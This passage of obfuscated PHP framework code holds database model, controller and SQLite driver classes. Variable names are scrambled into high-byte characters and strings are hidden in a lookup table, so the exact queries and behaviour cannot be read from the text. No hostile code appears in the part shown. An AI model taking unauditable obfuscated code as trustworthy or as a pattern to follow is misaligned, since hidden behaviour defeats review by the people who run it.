$Ü¾İæ‰ñ[3] . $¥ùÁëßÆ[118]; $Ï½û¥²Õ = "\165\x70\x64\141\164\145\x20{$­Ğø‹ãş}\x20\x73\x65\x74\40{$Èšà’›¼}\40\167\150\145\162\145\40{$¥ÀÀŠ²¶}\x3b"; $this->execute($Ï½û¥²Õ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($³ş÷ô¸ = false, $ª·çç‹¥ = false) { $this->_chunkEvent = $³ş÷ô¸; $this->_chunkEventParam = $ª·çç‹¥; } private function chunkEventCheck($éöÇñÚæ) { if (!$this->_chunkEvent) { return; } $¶˜¨ËÆš = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¶˜¨ËÆš[$_SERVER[³½¬ÚË¯][424]] = $éöÇñÚæ; Hook::trigger($this->_chunkEvent, $¶˜¨ËÆš); } public function addAll($×¡ÛÒ–ü, $ë¿åñ = array(), $§‰á•öı = false) { $¥×Ïí‹ =& $_SERVER[³½¬ÚË¯]; ignore_timeout(); $İŞªøÒ = self::SQL_WHERE_IN_CHUNK; if (empty($×¡ÛÒ–ü)) { $this->error = think_lang($¥×Ïí‹[315]); return !1; } $ë¿åñ = $this->_parseOptions($ë¿åñ); foreach ($×¡ÛÒ–ü as $ª’ºà«¯ => $­ÄëúÅ¤) { $×¡ÛÒ–ü[$ª’ºà«¯] = $this->_facade($­ÄëúÅ¤); $this->_beforeInsert($×¡ÛÒ–ü[$ª’ºà«¯], $ë¿åñ); } if (method_exists($this->db, $¥×Ïí‹[316])) { for ($ ËÚ¹–Ğ = 0; $ ËÚ¹–Ğ < count($×¡ÛÒ–ü); $ ËÚ¹–Ğ += $İŞªøÒ) { $ºı¨ÆË„ = array_slice($×¡ÛÒ–ü, $ ËÚ¹–Ğ, $İŞªøÒ); if (!is_array($ºı¨ÆË„) || count($ºı¨ÆË„) == 0) { break; } $—µ—Ü›Ë = $this->db->insertAll($ºı¨ÆË„, $ë¿åñ, $§‰á•öı); $this->chunkEventCheck(count($ºı¨ÆË„)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($×¡ÛÒ–ü as $ª’ºà«¯ => $­ÄëúÅ¤) { $—µ—Ü›Ë = $this->db->insert($­ÄëúÅ¤, $ë¿åñ, $§‰á•öı); } $this->commit(); } if (!1 !== $—µ—Ü›Ë) { $ÓÁëäÑê = $this->getLastInsID(); if ($ÓÁëäÑê) { return $ÓÁëäÑê; } } return $—µ—Ü›Ë; } public function save($¹ŒÎŒ  = '', $ÂÑ¼İœœ = array()) { $É‘â…÷‘ =& $_SERVER[³½¬ÚË¯]; $ı×´…Ç‰ = self::SQL_WHERE_IN_CHUNK; $ìèßÓˆ = $this->optionsValue(); $ì§­ôõÕ = $this->findWhereField($ìèßÓˆ); if (!$ì§­ôõÕ) { return parent::save($¹ŒÎŒ , $ÂÑ¼İœœ); } $áÁ²ÕÈª = 0; $Ô·È‡¸× = $ìèßÓˆ[$É‘â…÷‘[319]][$ì§­ôõÕ][1]; $Ô·È‡¸× = is_array($Ô·È‡¸×) ? $Ô·È‡¸× : array(); $ä‰ç…¡î = count($Ô·È‡¸×); for ($õãıˆÌ› = 0; $õãıˆÌ› < $ä‰ç…¡î; $õãıˆÌ› += $ı×´…Ç‰) { $òşÁ³á = array_slice($Ô·È‡¸×, $õãıˆÌ›, $ı×´…Ç‰); if (!is_array($òşÁ³á) || count($òşÁ³á) == 0) { break; } $ìèßÓˆ[$É‘â…÷‘[319]][$ì§­ôõÕ][1] = $òşÁ³á; $this->optionsValue($ìèßÓˆ); $áÁ²ÕÈª += parent::save($¹ŒÎŒ , $ÂÑ¼İœœ); $this->chunkEventCheck(count($òşÁ³á)); } $this->chunkEventSet(); return $áÁ²ÕÈª; } public function add($ÈœŒ = '', $ã‘èæˆæ = array(), $Â°’Æàª = false) { if ($this->addTaskStatus && is_array($ÈœŒ)) { $this->addTaskData[] = $ÈœŒ; return; } return parent::add($ÈœŒ, $ã‘èæˆæ, $Â°’Æàª); } public function parseWhereLike($Ñ¹Öº„‰, $îÙ¢£—¥ = '', $±æÂèÈ = false, &$´Ë‡÷äò = false) { $ßÍ×Á… =& $_SERVER[³½¬ÚË¯]; $ÈŸØü¾­ = $GLOBALS[$ßÍ×Á…[6]][$ßÍ×Á…[425]]; if (!$ÈŸØü¾­[$ßÍ×Á…[426]]) { return $Ñ¹Öº„‰; } if (!is_array($Ñ¹Öº„‰)) { return $Ñ¹Öº„‰; } $¥âÙ›­á = array(); $¨¨„ßÁ = 0; foreach ($Ñ¹Öº„‰ as $Ø¤Ì¸Ìå => $¿±¶¡¨¢) { if (is_array($¿±¶¡¨¢) && count($¿±¶¡¨¢) == 2 && $¿±¶¡¨¢[0] == $ßÍ×Á…[427] && is_string($¿±¶¡¨¢[1]) && substr($¿±¶¡¨¢[1], 0, 1) == $ßÍ×Á…[428] && substr($¿±¶¡¨¢[1], strlen($¿±¶¡¨¢[1]) - 1, 1) == $ßÍ×Á…[428]) { $´Ë‡÷äò = !0; $ù†äÎ€ = is_string($Ø¤Ì¸Ìå) ? $Ø¤Ì¸Ìå : $îÙ¢£—¥; $Â›™§™Ó = substr($¿±¶¡¨¢[1], 1, strlen($¿±¶¡¨¢[1]) - 2); $Â›™§™Ó = $this->db->escapeString($Â›™§™Ó); if (!strpos($ù†äÎ€, $ßÍ×Á…[10])) { $ù†äÎ€ = $ßÍ×Á…[429] . $ù†äÎ€ . $ßÍ×Á…[429]; } $Ã†ô«Ò² = $ßÍ×Á…[203] . $Â›™§™Ó . $ßÍ×Á…[203]; $Â›™§™Ó = str_replace(array($ßÍ×Á…[10], $ßÍ×Á…[430], $ßÍ×Á…[11]), $ßÍ×Á…[431], $Â›™§™Ó); if ($ÈŸØü¾­[$ßÍ×Á…[432]]) { $Ã†ô«Ò² = $ßÍ×Á…[433] . $Â›™§™Ó . $ßÍ×Á…[434]; if ($ÈŸØü¾­[$ßÍ×Á…[435]]) { $Ã†ô«Ò² = $ßÍ×Á…[434] . $Â›™§™Ó . $ßÍ×Á…[433]; } } $¥âÙ›­á[$¨¨„ßÁ] = $ßÍ×Á…[436] . $ù†äÎ€ . $ßÍ×Á…[437] . $Ã†ô«Ò² . $ßÍ×Á…[438]; $¨¨„ßÁ++; continue; } if (is_array($¿±¶¡¨¢)) { $îÙ¢£—¥ = is_string($Ø¤Ì¸Ìå) ? $Ø¤Ì¸Ìå : $îÙ¢£—¥; $¿±¶¡¨¢ = $this->parseWhereLike($¿±¶¡¨¢, $îÙ¢£—¥, !0, $´Ë‡÷äò); } if (is_numeric($Ø¤Ì¸Ìå)) { $¥âÙ›­á[$¨¨„ßÁ] = $¿±¶¡¨¢; $¨¨„ßÁ++; } else { $¥âÙ›­á[$Ø¤Ì¸Ìå] = $¿±¶¡¨¢; } } if ($´Ë‡÷äò && !$±æÂèÈ) { } return $¥âÙ›­á; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ä˜Ï„Æñ = array()) { $º‡î¡Ü÷ =& $_SERVER[³½¬ÚË¯]; $ğªîéÔ« = self::SQL_WHERE_IN_CHUNK; $·¥Òå = $this->optionsValue(); $ßç”Ÿøã = $this->findWhereField($·¥Òå); if (!$ßç”Ÿøã || isset($·¥Òå[$º‡î¡Ü÷[336]]) || isset($·¥Òå[$º‡î¡Ü÷[397]])) { return parent::select($Ä˜Ï„Æñ); } $¯×ËÄÈ¼ = $·¥Òå[$º‡î¡Ü÷[319]][$ßç”Ÿøã][1]; $¯×ËÄÈ¼ = is_array($¯×ËÄÈ¼) ? $¯×ËÄÈ¼ : array(); $úÀ¦–ÊÑ = null; for ($¶úÛĞ÷¹ = 0; $¶úÛĞ÷¹ < count($¯×ËÄÈ¼); $¶úÛĞ÷¹ += $ğªîéÔ«) { $°è–Ëİè = array_slice($¯×ËÄÈ¼, $¶úÛĞ÷¹, $ğªîéÔ«); if (!is_array($°è–Ëİè) || count($°è–Ëİè) == 0) { break; } $·¥Òå[$º‡î¡Ü÷[319]][$ßç”Ÿøã][1] = $°è–Ëİè; $this->optionsValue($·¥Òå); $üÙé§Å = parent::select($Ä˜Ï„Æñ); if (!$üÙé§Å) { continue; } $úÀ¦–ÊÑ = is_array($úÀ¦–ÊÑ) ? $úÀ¦–ÊÑ : array(); $úÀ¦–ÊÑ = array_merge($úÀ¦–ÊÑ, $üÙé§Å); } return $úÀ¦–ÊÑ; } public function delete($ƒ†»ìÉç = array()) { $ÓÎÇÀÕõ =& $_SERVER[³½¬ÚË¯]; $…ŸË‘¿‡ = self::SQL_WHERE_IN_CHUNK; $ó­«£åË = $this->optionsValue(); $¿æÛÛ‡ƒ = $this->findWhereField($ó­«£åË); if (!$¿æÛÛ‡ƒ) { return parent::delete($ƒ†»ìÉç); } $»ßÆ¥ü = 0; $­ŸìëÕå = $ó­«£åË[$ÓÎÇÀÕõ[319]][$¿æÛÛ‡ƒ][1]; $­ŸìëÕå = is_array($­ŸìëÕå) ? $­ŸìëÕå : array(); for ($ã‡ó¸ƒ“ = 0; $ã‡ó¸ƒ“ < count($­ŸìëÕå); $ã‡ó¸ƒ“ += $…ŸË‘¿‡) { $¤ë¤÷úÀ = array_slice($­ŸìëÕå, $ã‡ó¸ƒ“, $…ŸË‘¿‡); if (!is_array($¤ë¤÷úÀ) || count($¤ë¤÷úÀ) == 0) { break; } $ó­«£åË[$ÓÎÇÀÕõ[319]][$¿æÛÛ‡ƒ][1] = $¤ë¤÷úÀ; $this->optionsValue($ó­«£åË); $»ßÆ¥ü += parent::delete($ƒ†»ìÉç); } return $»ßÆ¥ü; } private function findWhereField($¦È…ãõ) { $°â²ÏÚÃ =& $_SERVER[³½¬ÚË¯]; $Ğ¾œ—˜¿ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¦È…ãõ) || !is_array($¦È…ãõ[$°â²ÏÚÃ[319]])) { return !1; } foreach ($¦È…ãõ[$°â²ÏÚÃ[319]] as $µË—‚®Ì => $›İ×»Ã) { if (is_array($›İ×»Ã) && isset($›İ×»Ã[0]) && is_string($›İ×»Ã[0]) && strtolower($›İ×»Ã[0]) == $°â²ÏÚÃ[7] && is_array($›İ×»Ã[1]) && count($›İ×»Ã[1]) > $Ğ¾œ—˜¿) { ignore_timeout(); return $µË—‚®Ì; } } return !1; } public function setMasterDB($ÆéÈ»‰§ = true) { think_config($_SERVER[³½¬ÚË¯][439], $ÆéÈ»‰§); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\x6d\117\x70\164\x69\157\156"; public $field = array(); public function listData($àÉäèÒ = false, $˜õ°¶“ç = "\155\x6f\x64\151\146\171\124\151\155\145", $¤–²ÑŠ = false) { $¹©áº = Model($this->modelType)->get(!1, $this->optionType, !0); $¾´´Ò¬¢ = array_values($¹©áº); if ($¾´´Ò¬¢ && $¾´´Ò¬¢[0] && !is_array($¾´´Ò¬¢[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¹©áº = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¹©áº) { return $àÉäèÒ ? null : array(); } if (!$àÉäèÒ) { $¹©áº = array_filter(array_values($¹©áº)); return array_sort_by($¹©áº, $˜õ°¶“ç, $¤–²ÑŠ); } return $¹©áº[$_SERVER[³½¬ÚË¯][440] . $àÉäèÒ]; } public function insert($›¦ßäí) { $€ºõîôş =& $_SERVER[³½¬ÚË¯]; $›¦ßäí = array_field_key($›¦ßäí, $this->field); $²¿‹Ìñø = Model($this->modelType)->get($€ºõîôş[441], $this->optionType . $€ºõîôş[442]); $²¿‹Ìñø = $²¿‹Ìñø ? $²¿‹Ìñø : 0; $›¦ßäí[$€ºõîôş[443]] = ++$²¿‹Ìñø; $›¦ßäí[$€ºõîôş[215]] = time(); $›¦ßäí[$€ºõîôş[85]] = time(); Model($this->modelType)->set($€ºõîôş[441], $²¿‹Ìñø, $this->optionType . $€ºõîôş[442]); Model($this->modelType)->set($€ºõîôş[440] . $²¿‹Ìñø, $›¦ßäí, $this->optionType); return $²¿‹Ìñø; } public function update($£Ğ¡×Ë§, $‰ÄğçÖß) { $â´¸½­û =& $_SERVER[³½¬ÚË¯]; $‰ÄğçÖß = array_field_key($‰ÄğçÖß, $this->field); $‡ğâ‰ÏÔ = $this->listData($£Ğ¡×Ë§); if (!$‡ğâ‰ÏÔ || !$£Ğ¡×Ë§) { return !1; } $‰ÄğçÖß = array_merge($‡ğâ‰ÏÔ, $‰ÄğçÖß); $‰ÄğçÖß[$â´¸½­û[85]] = time(); return Model($this->modelType)->set($â´¸½­û[440] . $£Ğ¡×Ë§, $‰ÄğçÖß, $this->optionType); } public function remove($©²âûì¿) { if (!$©²âûì¿) { return !1; } return Model($this->modelType)->remove($_SERVER[³½¬ÚË¯][440] . $©²âûì¿, $this->optionType); } public function clear() { $åÀÌ¹ÙĞ =& $_SERVER[³½¬ÚË¯]; Model($this->modelType)->remove($åÀÌ¹ÙĞ[441], $this->optionType . $åÀÌ¹ÙĞ[442]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÌĞ²õÌ, $‹ˆŠËÏê) { if (!$‹ˆŠËÏê) { return !1; } $”µÑ¡â = $this->listData(); $”µÑ¡â = array_to_keyvalue($”µÑ¡â, $ÌĞ²õÌ); return isset($”µÑ¡â[$‹ˆŠËÏê]) ? $”µÑ¡â[$‹ˆŠËÏê] : !1; } public function findByName($ê¤Àøç¸) { return $this->findByKey($_SERVER[³½¬ÚË¯][32], $ê¤Àøç¸); } protected function resetData($øôüÀ…‹) { $©÷“¾‹ =& $_SERVER[³½¬ÚË¯]; $øôüÀ…‹ = is_array($øôüÀ…‹) ? $øôüÀ…‹ : array(); $­î®Ü„— = array(); for ($éöªÓó’ = 0; $éöªÓó’ < count($øôüÀ…‹); $éöªÓó’++) { $­î®Ü„—[$©÷“¾‹[440] . $øôüÀ…‹[$éöªÓó’][$©÷“¾‹[443]]] = $øôüÀ…‹[$éöªÓó’]; } return Model($this->modelType)->set($­î®Ü„—, !1, $this->optionType); } private function getAutoName($¥µ—­Å¿) { $åÉåşŞá = array_to_keyvalue($this->listData(), $_SERVER[³½¬ÚË¯][32]); if (!$åÉåşŞá || !isset($åÉåşŞá[$¥µ—­Å¿])) { return $¥µ—­Å¿; } for ($«ùÍƒŒ = 1; $«ùÍƒŒ < count($åÉåşŞá); $«ùÍƒŒ++) { $ó¨Ê™Å = $¥µ—­Å¿ . "\x28{$«ùÍƒŒ}\x29"; if (!isset($åÉåşŞá[$ó¨Ê™Å])) { return $ó¨Ê™Å; } } return $ó¨Ê™Å; } } goto CŸ˜´¼ëŠŞ; F‡îì×•áÜ: define($_SERVER[³½¬ÚË¯][282], 1); define($_SERVER[³½¬ÚË¯][283], 2); define($_SERVER[³½¬ÚË¯][284], 3); goto DŠø£ìÍÙ; FŠ©ß£·˜«: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¹ÆÚşì‹ =& $_SERVER[³½¬ÚË¯]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¹ÆÚşì‹[6]] =& $config; $this->values[$¹ÆÚşì‹[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¹ÆÚşì‹[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($šÀ›‘€) { if (1 === func_num_args()) { $this->{$šÀ›‘€} = new $šÀ›‘€(); } else { $’ıÓì°Ç = new ReflectionClass($šÀ›‘€); $‰¨ÓÊ¢ = func_get_args(); array_shift($‰¨ÓÊ¢); $this->{$šÀ›‘€} = $’ıÓì°Ç->newInstanceArgs($‰¨ÓÊ¢); } return $this->{$šÀ›‘€}; } public function routeBind($”ÌØ®Ä, $ïÛ İÓœ, $ªúü‡³‰ = 3) { $ªˆ¨íç =& $_SERVER[³½¬ÚË¯]; $ã©õ¡å¤ = $this->in[$ªˆ¨íç[9]]; $”ÌØ®Ä = str_replace($ªˆ¨íç[10], $ªˆ¨íç[11], trim(trim($”ÌØ®Ä, $ªˆ¨íç[8]), $ªˆ¨íç[12])); if (!$”ÌØ®Ä || count($ã©õ¡å¤) <= $ªúü‡³‰) { return !1; } $¨ ÍŞÓÌ = !0; $š†ÖÖ˜Í = explode($ªˆ¨íç[8], $”ÌØ®Ä); for ($”ÂÄ°§Æ = 0; $”ÂÄ°§Æ < count($š†ÖÖ˜Í); $”ÂÄ°§Æ++) { if ($š†ÖÖ˜Í[$”ÂÄ°§Æ] != $ã©õ¡å¤[$ªúü‡³‰ + $”ÂÄ°§Æ]) { $¨ ÍŞÓÌ = !1; break; } } if (!$¨ ÍŞÓÌ) { return; } call_user_func_array(array($this, $ïÛ İÓœ), array()); } public function routeArgs($€ı½½Ë‡ = 3) { $îàä¬½ß = $this->in[$_SERVER[³½¬ÚË¯][9]]; if (count($îàä¬½ß) <= $€ı½½Ë‡) { return array(); } $¸ß¦÷¶ = array(); for ($·¯—¿¹ë = $€ı½½Ë‡; $·¯—¿¹ë < count($îàä¬½ß); $·¯—¿¹ë += 2) { $¸ß¦÷¶[$îàä¬½ß[$·¯—¿¹ë]] = $îàä¬½ß[$·¯—¿¹ë + 1]; $this->in[$îàä¬½ß[$·¯—¿¹ë]] = $îàä¬½ß[$·¯—¿¹ë + 1]; } return $¸ß¦÷¶; } protected function assign($ŸóÕ’¿ù, $ú­™Æâ) { $this->values[$ŸóÕ’¿ù] = $ú­™Æâ; } protected function display($Î†¥¯µ) { ob_end_clean(); extract($this->values); require $this->tpl . $Î†¥¯µ; } } class DbSqliteBase extends Db { public function __construct($ç†úüÉ = '') { $ş›à¬ı¥ =& $_SERVER[³½¬ÚË¯]; if (!extension_loaded($ş›à¬ı¥[13])) { think_exception(think_lang($ş›à¬ı¥[14]) . $ş›à¬ı¥[15]); } if (!empty($ç†úüÉ)) { if (!isset($ç†úüÉ[$ş›à¬ı¥[16]])) { $ç†úüÉ[$ş›à¬ı¥[16]] = 438; } $this->config = $ç†úüÉ; if (empty($this->config[$ş›à¬ı¥[17]])) { $this->config[$ş›à¬ı¥[17]] = array(); } } } public function connect($ŸÉ’³”„ = '', $ì‰Äı±‡ = 0) { $ìÇ¢´æ¢ =& $_SERVER[³½¬ÚË¯]; if (!isset($this->linkID[$ì‰Äı±‡])) { if (empty($ŸÉ’³”„)) { $ŸÉ’³”„ = $this->config; } $¬Ÿ×Ö„‹ = !empty($ŸÉ’³”„[$ìÇ¢´æ¢[17]][$ìÇ¢´æ¢[18]]) ? $ŸÉ’³”„[$ìÇ¢´æ¢[17]][$ìÇ¢´æ¢[18]] : $this->pconnect; $ŞÂßÑñ‹ = $¬Ÿ×Ö„‹ ? $ìÇ¢´æ¢[19] : $ìÇ¢´æ¢[20]; $this->linkID[$ì‰Äı±‡] = $ŞÂßÑñ‹($ŸÉ’³”„[$ìÇ¢´æ¢[21]], $ŸÉ’³”„[$ìÇ¢´æ¢[16]]); if (!$this->linkID[$ì‰Äı±‡]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ì‰Äı±‡], 30000); if (1 != think_config($ìÇ¢´æ¢[22])) { unset($this->config); } } return $this->linkID[$ì‰Äı±‡]; } public function free() { $this->queryID = null; } public function query($àñŠ’ò‰) { $¡‘É¤… =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $àñŠ’ò‰; if ($this->queryID) { $this->free(); } think_action_status($¡‘É¤…[23], 1); think_status($¡‘É¤…[24]); $this->queryID = sqlite_query($this->_linkID, $àñŠ’ò‰); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $·Ú¥òö = $this->getAll(); return $·Ú¥òö; } } public function execute($ÕÈíöÆç) { $¦úÑÊ™ª =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÕÈíöÆç; if ($this->queryID) { $this->free(); } think_action_status($¦úÑÊ™ª[25], 1); think_status($¦úÑÊ™ª[24]); $‘ä¬Š· = sqlite_exec($this->_linkID, $ÕÈíöÆç); $this->debug(); if (!1 === $‘ä¬Š·) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[³½¬ÚË¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚á”ğ…æ = sqlite_query($this->_linkID, $_SERVER[³½¬ÚË¯][27]); if (!$‚á”ğ…æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $€ë‹›ı = sqlite_query($this->_linkID, $_SERVER[³½¬ÚË¯][28]); if (!$€ë‹›ı) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ßûƒ¬° = array(); if ($this->numRows > 0) { for ($„ûÁÍ™Å = 0; $„ûÁÍ™Å < $this->numRows; $„ûÁÍ™Å++) { $ßûƒ¬°[$„ûÁÍ™Å] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ßûƒ¬°; } public function getFields($ƒÌÃÍõÌ) { $ÑÄµ˜ô =& $_SERVER[³½¬ÚË¯]; $ë½ËØ = $this->query($ÑÄµ˜ô[29] . $ƒÌÃÍõÌ . $ÑÄµ˜ô[30]); $±¡ÛıçÏ = array(); if ($ë½ËØ) { foreach ($ë½ËØ as $‰É‰‘êî => $¸›•Ú¾ô) { $±¡ÛıçÏ[$¸›•Ú¾ô[$ÑÄµ˜ô[31]]] = array($ÑÄµ˜ô[32] => $¸›•Ú¾ô[$ÑÄµ˜ô[31]], $ÑÄµ˜ô[33] => $¸›•Ú¾ô[$ÑÄµ˜ô[34]], $ÑÄµ˜ô[35] => (bool) ($¸›•Ú¾ô[$ÑÄµ˜ô[36]] === $ÑÄµ˜ô[12]), $ÑÄµ˜ô[37] => $¸›•Ú¾ô[$ÑÄµ˜ô[38]], $ÑÄµ˜ô[39] => strtolower($¸›•Ú¾ô[$ÑÄµ˜ô[40]]) == $ÑÄµ˜ô[41], $ÑÄµ˜ô[42] => strtolower($¸›•Ú¾ô[$ÑÄµ˜ô[43]]) == $ÑÄµ˜ô[44]); } } return $±¡ÛıçÏ; } public function getTables($Æ”êÙëã = '') { $ôş©“ƒÙ =& $_SERVER[³½¬ÚË¯]; $Åù†Œë = $this->query($ôş©“ƒÙ[45] . $ôş©“ƒÙ[46] . $ôş©“ƒÙ[47]); $í¹‚€åÂ = array(); foreach ($Åù†Œë as $ñà×ø‰İ => $™İÔº©) { $í¹‚€åÂ[$ñà×ø‰İ] = current($™İÔº©); } return $í¹‚€åÂ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÏŒ‰é¤— =& $_SERVER[³½¬ÚË¯]; $âª¶šıŠ = sqlite_last_error($this->_linkID); $this->error = $âª¶šıŠ . $ÏŒ‰é¤—[4] . sqlite_error_string($âª¶šıŠ); if ($ÏŒ‰é¤—[12] != $this->queryStr) { $this->error .= LNG($ÏŒ‰é¤—[48]) . $this->queryStr; } think_trace($this->error, $ÏŒ‰é¤—[12], $ÏŒ‰é¤—[49]); return $this->error; } public function escapeString($Š†åäÊÕ) { return sqlite_escape_string($Š†åäÊÕ); } public function parseLimit($‹½ÌŠë) { $øü»¤² =& $_SERVER[³½¬ÚË¯]; $š©çÉ¾ú = $øü»¤²[12]; if (!empty($‹½ÌŠë)) { $‹½ÌŠë = explode($øü»¤²[50], $‹½ÌŠë); if (count($‹½ÌŠë) > 1) { $š©çÉ¾ú .= $øü»¤²[51] . $‹½ÌŠë[1] . $øü»¤²[52] . $‹½ÌŠë[0] . $øü»¤²[53]; } else { $š©çÉ¾ú .= $øü»¤²[51] . $‹½ÌŠë[0] . $øü»¤²[53]; } } return $š©çÉ¾ú; } } class DbSqlite3Base extends Db { public function __construct($­‡ùÂæ² = '') { $ÀšÇÍ©Ş =& $_SERVER[³½¬ÚË¯]; if (!class_exists($ÀšÇÍ©Ş[54])) { think_exception(think_lang($ÀšÇÍ©Ş[14]) . $ÀšÇÍ©Ş[55]); } if (!empty($­‡ùÂæ²)) { if (!isset($­‡ùÂæ²[$ÀšÇÍ©Ş[16]])) { $­‡ùÂæ²[$ÀšÇÍ©Ş[16]] = 438; } $this->config = $­‡ùÂæ²; if (empty($this->config[$ÀšÇÍ©Ş[17]])) { $this->config[$ÀšÇÍ©Ş[17]] = array(); } } } public function connect($üûëŒá = '', $›Å‰…Ï = 0) { $Ï»Å § =& $_SERVER[³½¬ÚË¯]; if (!isset($this->linkID[$›Å‰…Ï])) { if (empty($üûëŒá)) { $üûëŒá = $this->config; } $this->linkID[$›Å‰…Ï] = new SQLite3($üûëŒá[$Ï»Å §[21]]); if (!$this->linkID[$›Å‰…Ï]) { think_exception($this->linkID[$›Å‰…Ï]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$›Å‰…Ï]->busyTimeout(30000); if (1 != think_config($Ï»Å §[22])) { unset($this->config); } } return $this->linkID[$›Å‰…Ï]; } public function free() { $this->queryID = null; } public function query($½ï¯˜¦Ï) { $›ì‡Óş  =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½ï¯˜¦Ï; if ($this->queryID) { $this->free(); } think_action_status($›ì‡Óş [23], 1); think_status($›ì‡Óş [24]); $this->queryID = $this->_linkID->query($½ï¯˜¦Ï); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $è®Ÿô« = $this->getAll(); $this->numRows = count($è®Ÿô«); return $è®Ÿô«; } } public function execute($÷âá¦ç¦) { $Ú¿†…‚ì =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $÷âá¦ç¦; if ($this->queryID) { $this->free(); } think_action_status($Ú¿†…‚ì[25], 1); think_status($Ú¿†…‚ì[24]); $¢ÖóÀæÀ = $this->_linkID->exec($÷âá¦ç¦); $this->debug(); if (!1 === $¢ÖóÀæÀ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[³½¬ÚË¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ ˆä«  = $this->_linkID->query($_SERVER[³½¬ÚË¯][27]); if (!$ ˆä« ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ƒÈ‰¦— = $this->_linkID->query($_SERVER[³½¬ÚË¯][28]); if (!$ƒÈ‰¦—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $û±¶³¸Ì = array(); while ($»®Ë²ë = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $û±¶³¸Ì[] = $»®Ë²ë; } $this->queryID->reset(); return $û±¶³¸Ì; } public function getFields($Òò¯™Á¶) { $¤Î‡÷­µ =& $_SERVER[³½¬ÚË¯]; $®¡ï•¿™ = $this->query($¤Î‡÷­µ[29] . $Òò¯™Á¶ . $¤Î‡÷­µ[30]); $Ä³¢€Ïá = array(); if ($®¡ï•¿™) { foreach ($®¡ï•¿™ as $‘äå–¤ã => $¿èíÉ¯Õ) { $Ä³¢€Ïá[$¿èíÉ¯Õ[$¤Î‡÷­µ[32]]] = array($¤Î‡÷­µ[32] => $¿èíÉ¯Õ[$¤Î‡÷­µ[32]], $¤Î‡÷­µ[33] => $¿èíÉ¯Õ[$¤Î‡÷­µ[33]], $¤Î‡÷­µ[35] => (bool) ($¿èíÉ¯Õ[$¤Î‡÷­µ[35]] === $¤Î‡÷­µ[12]), $¤Î‡÷­µ[37] => $¿èíÉ¯Õ[$¤Î‡÷­µ[56]], $¤Î‡÷­µ[39] => (bool) $¿èíÉ¯Õ[$¤Î‡÷­µ[57]], $¤Î‡÷­µ[42] => (bool) $¿èíÉ¯Õ[$¤Î‡÷­µ[57]]); } } return $Ä³¢€Ïá; } public function getTables($Ã®­È¯® = '') { $ªà‹šîÑ =& $_SERVER[³½¬ÚË¯]; $Œ‰‘üçâ = $this->query($ªà‹šîÑ[45] . $ªà‹šîÑ[46] . $ªà‹šîÑ[47]); $ÚÆœëş› = array(); foreach ($Œ‰‘üçâ as $İœôçıû => $ŠğíÌÌœ) { $ÚÆœëş›[$İœôçıû] = current($ŠğíÌÌœ); } return $ÚÆœëş›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ê€î˜Ù¼ =& $_SERVER[³½¬ÚË¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ê€î˜Ù¼[12] != $this->queryStr) { $this->error .= LNG($Ê€î˜Ù¼[48]) . $this->queryStr; } think_trace($this->error, $Ê€î˜Ù¼[12], $Ê€î˜Ù¼[49]); return $this->error; } public function escapeString($­¿Œ­Á³) { $ÖğûĞ‰ =& $_SERVER[³½¬ÚË¯]; if ($this->_linkID) { return $this->_linkID->escapeString($­¿Œ­Á³); } return str_ireplace($ÖğûĞ‰[58], $ÖğûĞ‰[59], $­¿Œ­Á³); } public function parseLimit($°å®ŸÄ) { $•ï¤­ø² =& 